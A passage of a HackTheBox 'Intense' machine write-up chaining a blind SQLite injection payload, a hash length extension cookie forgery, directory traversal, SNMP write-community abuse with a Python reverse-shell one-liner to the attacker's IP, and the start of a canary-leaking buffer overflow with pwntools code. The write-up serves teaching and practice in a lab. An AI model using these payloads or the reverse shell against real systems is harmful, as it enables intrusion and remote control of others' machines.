# Intense-walktrough
Writeup of the HACKTHEBOX Intense machine

Intense was a very long road to user, and all about binary for the root. I'll use a sqlite injection to have the admin password hash, then use the Hash Length Extension attack to put our hash into the cookie without knowing the random generated key. and finally have access to the admin panel where i perform a directory traversal through a none sanitazed logfile input. But to have a user shell we have to read the snmpd config file and use a secret community with "wr" right and abuse it to for RCE.
Finally for root, I'll use a locally running server, require read the canary ebp and return address to allow for an overflow and defeat PIE, and then doing a ROP to libc leak to get past ASLR, all to send an other ROP which provide a shell as root.

## Recon
### nmap and masscan

I use masscan and nmap for a quick scan, here's my script which create a keepnote page report from the scan, found it [here](https://github.com/roughiz/scautofire).
masscan shows 2 tcp ports and one udp port:

```
nmap -sV -sS -p 22,80 -T4 -sC -oN /Lab/htb/Intense/nmap.txt 10.10.10.195
Nmap scan report for 10.10.10.195
Host is up (0.082s latency).

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
| 256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_ 256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (EdDSA)
| vulners: 
| cpe:/a:openbsd:openssh:7.6p1: 
80/tcp open http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
................
.........................

161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
| enterprise: net-snmp
| engineIDFormat: unknown
| engineIDData: f20383648c26d05d00000000
| snmpEngineBoots: 603
|_ snmpEngineTime: 16m42s
| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
|_ System uptime: 16m42.60s (100260 timeticks)
Service Info: Host: intense
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Website - TCP 80

#### Site

The site present a home page which tell you that you can login as guest with password guest. I can also download the source code of the app.
![site](https://github.com/roughiz/Intense-walktrough/blob/master/images/site_guest.png)

Login as "guest" i have a cookie with the parameter "auth" and it contains the guest username and the secret as a sha256 hash, all encoded as base64.

![cookie](https://github.com/roughiz/Intense-walktrough/blob/master/images/cookie_param.png)

#### Code source 

Analyzing the python code source, i found two entries. two admin route which could allows us perform a directory traversal attack and read files from the box. and an other enumerating directories from the box. theses routes are admin access only. The idea is to find a way to be admin.

With a simple look in the code, i found a possibility to perform a sqlite injection exploiting an "insert into" not sanitazed user input, and bruteforce the admin password.
![insert](https://github.com/roughiz/Intense-walktrough/blob/master/images/insert.png)

The vulnerable sqlite request: 

``` 
new_msg= "insert into messages values ('%s')" % message
```

I used this vulnerable code through the "/submitmessage" route, we also have a blacklisted words and the message should be <= 140.

```
badwords = ["rand", "system", "exec", "dated"]
...
...
if len(message) > 140:
        return "message too long"
    if badword_in_str(message):
        return "forbidden word in message"
```
![badword](https://github.com/roughiz/Intense-walktrough/blob/master/images/badwords.png)

### Sqlite injection

With the insert sql request i can't return any Db infos, but i can perform an injection guessing the admin secret by the return messsage.

Due to badwords restriction i can't use functions like "randomblob" to perform a Time based attack. but with more googling i found a sqlite conditional structure which use 

```
CASE WHEN ( expression)
   THEN
    ACTION
   ELSE
    ACTION
 ```

With this structure i can bruteforce password using "substr()" function, if i had the right caracter, case try to load an inexistant file with function "load_extensions()" which will return an error "not authorized". I created a python script which can perfom a user and password enumeration using bruteforce.

```
')Union SELECT CASE WHEN username='"""+username+"""' and role=1 and substr(secret,%s,1)='%s' THEN(select load_extension("/tmp/nofile"))END FROM users;--"
```

![sqli](https://github.com/roughiz/Intense-walktrough/blob/master/images/sqli.png)

####### Reference - Sqlite Sqli 

[sqlite sqli cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

We can also use many other functions, the goal is to return an error or a return message to know if the condition was true or false.

We have all slqite functions from [here](https://sqlite.org/lang_corefunc.html)

#### Exploit [scirpt](https://github.com/roughiz/Intense-walktrough/blob/master/code/blind_sqlitei_brutfpass.py)

```
$ python3 blind_sqlitei_brutfpass.py -e "not authorized" -l http://10.10.10.195/submitmessage -p "message"

 ____   ____   ____   ____ _     _       _              _ 
|  _ \ / __ \ / /\ \ / ___| |__ / |____ | |_ ___   ___ | |
| |_) / / _` | |  | | |  _| '_ \| |_  / | __/ _ \ / _ \| |
|  _ < | (_| | |  | | |_| | | | | |/ /  | || (_) | (_) | |
|_| \_\ \__,_| |  | |\____|_| |_|_/___|  \__\___/ \___/|_|
       \____/ \_\/_/                                      

Find all scripts in: https://github.com/roughiz


SQLITE Injection script by R0()Gh1z
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


The password length is : 64
The password: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105%

```

#### User Cookie

Here we have the admin sha256 hash, i tried to crack this hash using rainbow table attack but wwithout any success. When we login, the app create an auth cookie parameter which contains: the value of username and the secret (password as a sha256sum hash) and a data signatrure.

From the source code we see that this signature is an sha256(data+RANDOM_KEY) concatenated to the base64 user data like :

```
Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.8gBaHbzPp0ED3TIxxs0NXLmjTfRaiBbpIckgfBPQfac=
```

```
$ echo -n "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7" | base64 -d
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
```

The encoded base64 signature is created like :

```
sign=sha256(SECRET + msg).digest()

```

And the secret is created as a random bytes of a length of  8<=length=<14

```
SECRET = os.urandom(randrange(8, 15))
```

```
auth=base64(Data)+"."+base64(signed(Data))

auth=base64("username=username;secret=hash_256_password;")+"."+base64(sha256(SECRET + Data1).digest())
```

### Hash length extension attack

From a previous CTF i know that this type of signature is weak to a crypto attack called "hash length extension", this attack is well explained in this [article](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) 

Even if we don't know the secret key, we can add our payload to the signed auth parameter without corrupt the integrity of the data.

We can append the ";username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;" to the previous auth cookie parameter, an the web server will use the second username 'admin' and the secret of admin. Here the code used by the sevrer to parse the paramter "auth"

This portion of code which parse the "auth" and create a dictionnary as '{key:value}'. 
It will ecrase the first key username "guest" with the second usrername "admin" and the same with secret. So the attack will works great with the new appended data, like :

```
"username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;________JUNK_______;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;"
```

```
for group in data.split(b';'):
        try:
            if not group:
                continue
            key, val = group.split(b'=')
            info[key.decode()] = val
        except Exception:
            continue
    return info
```

To use the python hashpump() function we need the data, signature and the new data to append and also the key length. The key lenght is a random number:

```
SECRET = os.urandom(randrange(8, 15))
```

THe key length is between   8<=key_lenght<15. I have to use a loop in the range(0,15) like :

```
for key_len in range(8,15):
  new_sign,msg= hashpump(prev_sign.hex(),prev_msg.decode(),Admin_data,key_len)
```

The final [scirpt](https://github.com/roughiz/Intense-walktrough/blob/master/code/add_payload_to_cookie.py)

#### Exploit 

```
$ python3  add_payload_to_cookie.py
Exploit success
The cookie : auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxg7dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7./3cvmSDtTybVhXH/6ctAxm+epKdJZ5Eom+ZAVBuiTN4=

The key lenght was :12

```

### Admin access

I put this cookie parameter into the browser and now i'm admin and i have access to the route "/admin"

![admin_access](https://github.com/roughiz/Intense-walktrough/blob/master/images/admin_access.png)

From the app code source we have two routes in admin section.

![admin_entries](https://github.com/roughiz/Intense-walktrough/blob/master/images/admin_entries.png)

To have access we have to send a post request with the parameter "logfile" for the route "admin/log/view". post a filename param like : "logfile=test"
The app source code will verify if the file exist in the "logs/" directory, and open it and return the content :

```
if not path.exists(f"logs/{filename}"):
        return f"Can't find {filename}"
    with open(f"logs/{filename}") as out:
        return out.read()
```

The logfile paramter is not sanitazed and we can perform a directory traversal and read any file, like "/etc/passwd".

![read_file](https://github.com/roughiz/Intense-walktrough/blob/master/images/passwd.png)


### Digging into snmp

After some digging, i returned to the first enumeration step where we found the snmp udp port, so let's read the file configuration maybe we have a secret community.

From snmpd config file i had a new snmp community :

![snmp](https://github.com/roughiz/Intense-walktrough/blob/master/images/snmpd_config.png)

```
 rocommunity public  default    -V systemonly
 rwcommunity SuP3RPrivCom90
....
```

#### SNMP background

Simple Network Management Protocol (snmp) is designed to collect and configure information about devices over the network. The information is organized into a Management Information Base (MIB). Object Identifiers (OID) uniquely identify objects in the MIB. For example, 1.3.6.1.2.1.4.34 is the OID that describes the ipAddressTable. 1.3.6.1.2.1.4.34.1.3 is the ipAddressIfIndex (interface index).

#### Tool Setup

If I run snmpwalk as installed on Kali without further setup, it just prints out the OIDs, which aren't too meaningful. By installing the mibs package, it will turn the numbers into strings that have meaning. First, install the mibs-downloader:

```
$ apt install snmp-mibs-downloader
```

Then go into /etc/snmp/snmp.conf and comment out the only uncommented line to use the mibs.

#### snmpwalk Overview

With the mibs installed, I can just dump the entire snmp as follows and then work out of a that file to find the information I need:

```
$ snmpwalk -v 2c -c public 10.10.10.195                         
SNMPv2-MIB::sysDescr.0 = STRING: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6762191) 18:47:01.91
SNMPv2-MIB::sysContact.0 = STRING: Me <user@intense.htb>
SNMPv2-MIB::sysName.0 = STRING: intense
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.2 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.3 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6764473) 18:47:24.73
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2020-10-9,14:52:6.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-4.15.0-55-generic root=UUID=03e76848-bab1-4f80-aeb0-ffff441d2ae9 ro debian-installer/custom-installatio"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 166
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

With the "public" community we have the defaul systemonly "ro" read only right, and nothing intersting, but now we have also a secret community "SuP3RPrivCom90" with "rw" read and right.
Let's now dive into this community :

```
$  snmpwalk -v 1 -c SuP3RPrivCom90 10.10.10.195  > snmp_Mib_db.txt
```

We dump the MIB db of snmpd server so let's search some useful info from here :

######## Get the list of process with the snmp OID: hrSWRunName like :

```
$ grep -i "hrSWRunName" snmp_Mib_db.txt
.....
HOST-RESOURCES-MIB::hrSWRunName.26 = STRING: "writeback"
HOST-RESOURCES-MIB::hrSWRunName.966 = STRING: "note_server"
HOST-RESOURCES-MIB::hrSWRunName.368 = STRING: "raid5wq"
HOST-RESOURCES-MIB::hrSWRunName.1186 = STRING: "nginx"
HOST-RESOURCES-MIB::hrSWRunName.1187 = STRING: "nginx"
HOST-RESOURCES-MIB::hrSWRunName.1188 = STRING: "nginx"
....
....
```

From here we can see the presence of "nginx" a web server and proxy (maybe an http port in ipv6)

To search about ip addresses i used the "IpAddressType" OID like :

```
$ grep -i "ipAddressType" snmp_Mib_db.txt
IP-MIB::ipAddressType.ipv4."10.10.10.195" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv4."10.10.10.255" = INTEGER: broadcast(3)
IP-MIB::ipAddressType.ipv4."127.0.0.1" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:5e:06" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:5e:06" = INTEGER: unicast(1)
....
```

We can also use a tool [Enyx](https://github.com/trickster0/Enyx) for IPv6 enumeration :

``` 
$ python enyx.py  1 SuP3RPrivCom90 10.10.10.195
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:5e06
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:5e06
``` 

###### Nota: 
**To use "enyx.py" tool, we need to uncoment the "mibs" line from file /etc/snmp/snmp.conf**

###### Nota about IPV6 address here: 
**One thing to note about the IPv6 address here - It will change on reset. So if I get the address today and interact with the site, when I come back next week, I'll likely have to find the address again.**


#### Nmap IPV6: 

```
$ nmap -6 -sT -p- --min-rate 5000 dead:beef:0000:0000:0250:56ff:feb9:5e06 

Starting Nmap 7.60 ( https://nmap.org ) at 2020-10-02 21:31 CEST
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 20.32% done; ETC: 21:33 (0:01:11 remaining)
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 55.79% done; ETC: 21:33 (0:00:40 remaining)
Nmap scan report for dead:beef::250:56ff:feb9:5e06
Host is up (0.091s latency).
Not shown: 64451 filtered ports, 1083 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

we dont find anything new from here, so i return back to the snmp and fonund that write access to the community can let's us execute a command ans so have an RCE.
Firstly i tired a ping command.
```

I found nothing intersting with IPV6, and with some googling snmp seems vulnerable to a RCE if we have a "write" right community. 

#### ABUSING SNMP for RCE 

If you have a SNMP community with write permissions on a Linux target, you can achieve code execution by abusing the "NET-SNMP-EXTEND-MIB" extension.
The SNMP service can be extended in multiple ways, one possibility are the functions provided by the MIB “NET-SNMP-EXTEND-MIB”. From the RedHat Linux Documentation:

The Net-SNMP Agent provides an extension MIB (NET-SNMP-EXTEND-MIB) that can be used to query arbitrary shell scripts. To specify the shell script to run, use the extend directive in the /etc/snmp/snmpd.conf file. Once defined, the Agent will provide the exit code and any output of the command over SNMP.
So, by invoking the NET-SNMP-EXTEND-MIB over SNMP, it is possible to call arbitrary scripts/executables on the server. As the SNMP user running the service.

A detailed [article](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/) about snmp RCE.

We put a reverse shell command into the "NET-SNMP-EXTEND-MIB" object , and execute it with snmwalk

#### Exploit code

```
$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 \     
    10.10.10.195 \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /usr/bin/python3 \
    'nsExtendArgs."command"'    = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.X\",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
And execute it like:

``` 
$  snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195  nsExtendObjects
```

![snmp_rce](https://github.com/roughiz/Intense-walktrough/blob/master/images/snmpset.png)

## Shell and user flag:

Finally caught a shell as "Debian-snmp" and the user flag.

![shelluser](https://github.com/roughiz/Intense-walktrough/blob/master/images/shell_user.png)

![flag](https://github.com/roughiz/Intense-walktrough/blob/master/images/user-flag.png)

## Road to root :

With a simple enumeration i found a local server running as root. we also have the source [code](https://github.com/roughiz/Intense-walktrough/blob/master/code/note_server.c) of the server.
The server is listening  locally to the port 5001.

```
$ netstat -lapute | grep -i root
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      root       28244      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      root       29822      -                   
tcp        0      0 localhost:5001          0.0.0.0:*               LISTEN      root       24451      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      root       29824      -                   
udp    46080      0 0.0.0.0:snmp            0.0.0.0:*                           root       28889      -                   
udp        0      0 0.0.0.0:35650           0.0.0.0:*                           root       28878      -                   
udp        0      0 0.0.0.0:54560           0.0.0.0:*                           root       664836     -                   
```

#### Code source analyse

The main function use a socket and wait for a client to connect,in each connection the server create a child process with fork(). this process will handle the client request.

```
newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

```

```
/* Create child process */
        pid = fork();

        if (pid < 0) {
            perror("ERROR on fork");
            exit(1);
        }

        if (pid == 0) {
            /* This is the client process */
            close(sockfd);
            handle_client(newsockfd);
            exit(0);
```

In the "handle_client(int sock)" the server wait for a command, the command is set as a 1 byte and there are 3 commands :

**Command 1 : read from client buffer and put into the note array**
**Command 2: copy data from an offset of the note array to an other offset "index" in the same array.**
**Command 3: write the content of the note array.**

```
if cmd == 1:
  if the second byte which represent the "buffer size" should not be (buffer_zise +index) > BUFFER_SIZE  
  The rest of bytes represent data which we will put in the note buffer, the size is "buffer_size"
  Each time we put a datas  into note array,  "index" will be incremented as (index+=buff_size)

if cmd== 2:
   We can perform a bof from here. with "memcpy(&note[index], &note[offset], copy_size);"
   If  0<offset<= index and (offset +copy_size) > 1024 we can put data over the buffer 

 (read(sock, &offset, 2) != 2)   #  0<offset<= index
 read(sock, &copy_size, 1) != 1)  # Length of the buffer to copy into note[index]
 memcpy(&note[index], &note[offset], copy_size);  


if cmd==3:
  write the note content into the client, write will read the size on "index" bytes
  write(sock, note, index);


**1) After using the command 2 and copying into the buffer, index will be increment by "copy_size", that's means if we use the command 3 just after write over the buffer we can read**
(index + copy_size) bytes.

**2) When we try to copy with command 2 if index == offset we can perform a buffer overflow but without changing the top stack data. but wuth command 3 we can read what the top stack contains.**
memcpy(&note[index], &note[offset], copy_size);
index += copy_size;

####------------------------------------------------------------------------------------
####****************************************************
####-----------------------------------------------------------------------------------
        ^          ^
      Offset      Index
```

Now seems like a good time to check out what protections are in place. I'll use the same gcc command to compile the c file. 

```
$ gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server
```

gcc use compilation flags like "PIE" and "stack-protector-al" etc... Let's see what protection with checksec:

![checkserver](https://github.com/roughiz/Intense-walktrough/blob/master/images/checkserver.png)

#### Strategy

This will be a simple ROP exploit, where I chain together gadgets, or small snippets of code that each move one or two pieces into place and return to the next one. To do this I'll need some gadgets. I'll also need a way to leak the canary, as well as the address space for the program, since PIE is enabled.

This took a long time of playing around, debugging, setting break points, examining memory, etc to get working. It's hard to show all that, but doing it is how you get better at it.

#### Canary protection 

Even if we can perform a bof , the canary protection will  throw a "stack smashing detected".
The canary is a random 8bytes selected each time the bianry start. in our case the program use fork() to handle a new client connection. This doesn't change when a new process is forked to handle my request.

###### Nota: 

**To prevent from the canary reuse with fork(). Use execve() after the fork(), sections "text" "data" and "bss" will change the memory and use a new random canary value.**

With radare2 we can see the code where the random 8bytes canary is stored just on top of the stack and any buffer overflow trying to overwite the return address,  wil modify the canary QWORD before.
Here is the code before the ret which will verify if the content of this QWORD is the same as the one created by the binary in the execution.

```
The code :
││ │╎   0x55f984d95de6      488b45f8       mov rax, qword [var_8h]
│   ││ │╎   0x55f984d95dea      644833042528.  **xor rax, qword fs:[0x28]**
│   ││┌───< 0x55f984d95df3      740c           **je 0x55f984d95e01**
│  ┌──────< 0x55f984d95df5      eb05           jmp 0x55f984d95dfc
│  ││││││   ; CODE XREFS from sym.handle_client @ 0x55f984d95ce7, 0x55f984d95dc5
│  │└└─└└─< 0x55f984d95df7      e9d3fdffff     jmp 0x55f984d95bcf
│  │  │     ; CODE XREF from sym.handle_client @ 0x55f984d95df5
│  └──────> 0x55f984d95dfc      e88ffbffff     **call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)**
│     └───> 0x55f984d95e01      c9             leave
└           0x55f984d95e02      c3             **ret**
```

Binary compare the canary block from var_8h which "rbp-0x8" with the constant value of canary "fs:[0x28]"
After the xor of the two QWORDS "rax" and "fs:[0x28]" it will jmp to the end of function to leave, or call the function "imp.__stack_chk_fail"

#### Find the offset where the canary begin:

We can't directly write over the buffer, but we have to put the data into the note array. First through the command 1 and use the command 2 to define the offset from where we will write over the buffer.
I create a "pattern_offset" with gdb, and put it in the notes[512] offset= 512, and put a breakpoint and read the "rbp-0x8" to find the location of the offset before the canary QWORD.
I used gdb with (peda configuration) to debug this forked process.  like: 

###### Nota: 
**To run gdb for something like this, I'll want to have follow-fork-mode child as I already saw that the server will fork the processing into a new process. I'll also want to set detach-on-fork off so that I don't have to constantly restart gdb. I did this by dropping those two into my ~/.gdbinit file, along with peda**

```
$ cat ~/.gdbinit
source ~/peda/peda.py
set follow-fork-mode child
set detach-on-fork off
```

Next, start the binary on it's own, and then attach to it with gdb using the -p [pid] option. It will then run up to the accept call and break, since that's where the program is waiting for input. Once a child thread completes, I'll just run inferiors 1 to go back to the main thread. Sometimes things get screwed up, and I'll just restart gdb.

```
$ gdb - p pid
```

```
0x555555554de6 <handle_client+588>:	mov    rax,QWORD PTR [rbp-0x8]
   0x555555554dea <handle_client+592>:	xor    rax,QWORD PTR fs:0x28
   0x555555554df3 <handle_client+601>:	je     0x555555554e01 <handle_client+615>
   0x555555554df5 <handle_client+603>:	jmp    0x555555554dfc <handle_client+610>
   0x555555554df7 <handle_client+605>:	jmp    0x555555554bcf <handle_client+53>


$ gdb-peda$ break *handle_client+588
$ gdb-peda$ show follow-fork-mode             (to follow any created fork process,if not already puted into .gdbinit)
$ run
 
gdb-peda$ pattern_create 255
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%'


gdb-peda$ x/3xg $rbp-0x8 
0x7fffffff8fb8:	**0x6e41412441414241**	0x41412d4141434141
0x7fffffff8fc8:	0x413b414144414128
```

Here we have the content of '$rbp-0x8' where the canary is stored. And with gdb we can found how much offset before this address:

```
gdb-peda$ pattern_offset 0x6e41412441414241
7944702841627689537 found at offset: 8
```

**The canary start after 8 bytes**

#### Read canary EBP and the return address

The function used to copy a note into in other offest is "memcpy":

```
void *memcpy(void *dest, const void * src, size_t n)
```

This function dosen't verify the presence of "\x00" end of string. and so we can put "\x00" in the payload and the function will continue copying.
The first canary byte is always "\x00" to block any payload using a functions like "scanf()" etc which stop reading when find the "\x00".
With the first test to know how much bytes to reach the canary block we caught 8 bytes.

```
 => |          Buffer                   |          8 bytes junk        |         8 Bytes of canary    |           8 Bytes RBP            |         8 Bytes Return Address   |
```

- We place index at the end of buffer(put 1024 bytes into notes[])
- With CMD2 we put the offset at 1024 too and tell "memcpy()" to copy 32 bytes which represent the 4 qword (qword == 64bits == 8bytes), and add 32 to index(index+=32)
- We  overrite the buffer but we copy the same value, because "dest" and "src" offset are the same, so we overwite without throw a  smach stack error. 
- Using the CMD3, we can write the note buffer(send to client), and read the buffer + 32bytes after the buffer (canary,EBP,RIP)

#### Code

```
def read_canary_ebp_rsp():
    payload_fullbuff= put_payload_into_notebuffer()

    #Now index =1024, let's use CMD2 and define offset as 1024 and use memcpy() to copy the canary rbp and rsp into the end of the node[]
    payload_bof =copy_to_note(1024,32)    
    # send the two payload and read the three registers
    p = remote(args.ip,args.port)
    p.send(payload_fullbuff)  # send the payload to put all in the note buffer
    p.send(payload_bof)   # throw bof wiht cmd2

    data= p.recv()
    canary=u64(data[1024+8:1024+16])
    RBP=u64(data[1024+16:1024+24])
    RIP=u64(data[1024+24:1024+32])
    
    canary_formated = binascii.hexlify(struct.pack(">Q",canary)).decode() # fromated address to little endian and in hexa form 
    RBP_formated = binascii.hexlify(struct.pack(">Q",RBP)).decode() # fromated address to little endian and in hexa form 
    RIP_formated = binascii.hexlify(struct.pack(">Q",RIP)).decode() # fromated address to little endian and in hexa form 

    print(colored("Canary: 0x%s "%canary_formated,"green"))
    print(colored("RBP:    0x%s "%RBP_formated,"green"))
    print(colored("RIP:    0X%s "%RIP_formated,"green"))
    p.close()
    return (canary,RBP,RIP)
```

### Leak libc 

Now I know the memory space of the main program, but not the libc. I also know the canary and can overwrite the return address. I'll use a rop chain to leak a libc address, and then can calculate the addresses of any functions or strings in libc I want. In the program, it uses "write" to send data to the socket. I'll use a write call to send the GOT table address for the write function.

#### Program base Address:

Because PIE is enabled it means that even if my gadgets are in the main program, they still move around in memory.
I'll use my leaked return address (RIP) to find the offset of the program base. The return address I leak will always be as the same distance from the base into that memory space. So I can simply look at that address and the memory map, and calculate the offset.

```
gdb-peda$ x/3xg $rbp-0x8
0x7fffffff8fb8:	0xd0fe47edd3651300	0x00007fffffff90c0
0x7fffffff8fc8:	**0X0000555555554f54**
gdb-peda$ info proc mappings
process 31711
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
